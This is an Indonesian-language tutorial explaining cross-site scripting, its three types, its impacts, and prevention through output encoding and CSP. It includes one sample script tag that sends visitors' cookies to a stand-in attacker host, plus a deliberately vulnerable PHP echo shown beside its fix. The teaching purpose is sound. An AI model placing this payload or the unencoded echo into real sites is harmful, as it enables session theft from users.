# Pengenalan Serangan Cross-Site Scripting XSS dan Cara Kerja Eksploitasinya

## Analogi: Perpustakaan Digital

Bayangkan **papan pengumuman** di perpustakaan yang bisa ditempeli catatan oleh pengunjung. Pengunjung jahat menempelkan catatan yang bertuliskan: "Klik di sini untuk mendapat buku gratis" — tapi tautannya sebenarnya mencuri data login pengunjung lain.

**XSS (Cross-Site Scripting)** adalah serangan di mana penyerang menyisipkan **skrip jahat** ke halaman web yang kemudian dijalankan oleh browser pengguna lain.

## Penjelasan Detail

### Jenis XSS
1. **Stored XSS** — Skrip disimpan di server (komentar, profil) dan dijalankan setiap kali halaman dimuat
2. **Reflected XSS** — Skrip ada di URL dan dijalankan sekali saat diklik
3. **DOM-based XSS** — Skrip dijalankan lewat manipulasi DOM sisi klien

### Contoh Serangan
```html
<!-- Komentar berisi skrip jahat -->
<div class="komentar">
  Selamat datang! <script>document.location='https://jahat.com/curi-cookie?'+document.cookie</script>
</div>
```

### Dampak
- Pencurian cookie/session
- Redirect ke situs phishing
- Menampilkan konten palsu
- Mencuri data input pengguna

## Contoh Pencegahan

```html
<!-- ❌ Rentan XSS: langsung menampilkan input pengguna -->
<div><?php echo $_POST['komentar']; ?></div>

<!-- ✅ Aman: encode output -->
<div><?php echo htmlspecialchars($_POST['komentar'], ENT_QUOTES, 'UTF-8'); ?></div>
```

## Poin Penting
- XSS = serangan menyisipkan **skrip jahat** ke halaman
- Tiga jenis: **Stored**, **Reflected**, **DOM-based**
- Cegah dengan **encoding output** (htmlspecialchars)
- Gunakan **Content Security Policy (CSP)**
- Validasi dan sanitasi semua input pengguna
